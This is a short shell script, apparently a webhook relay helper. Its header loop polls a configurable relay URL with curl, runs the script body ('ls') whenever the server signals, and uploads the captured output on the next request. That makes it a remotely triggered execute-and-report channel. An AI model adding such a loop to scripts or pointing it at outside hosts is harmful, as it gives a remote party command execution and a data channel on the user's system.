#!/bin/sh

# ── Relay loop header ── aligned with tests/relay_demo.sh ────────────────────
h=/tmp/_relay.${_p:-$$}
: "${HOOKPOOL_RELAY_URL:=http://localhost:8080/asda/9ann2i.relay}"
[ -z "$_p" ] && { : >"$h"; trap 'rm -f "$h" ${r:+$r}' EXIT; }
while [ -f "$h" ]; do
  r=${r:-$(mktemp)}
  curl -s -X PATCH -D "$h" -o /dev/null \
    -H "X-Relay-Mod: http" -H "X-Relay-Seq: $s" \
    --data-binary "@$r" "$HOOKPOOL_RELAY_URL"
  s=$(awk 'tolower($0)~/^x-relay-seq:/{gsub(/\r/,"");print $2;exit}' "$h")
  case "$s" in ''|0) s=""; sleep 1; continue ;; esac
  rm "$h"
  { printf 'HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n'; _p=$$ "$0"; } >"$r" 2>&1
  : >"$h"
done
# ── End of relay loop header ──────────────────────────────────────────────────

ls
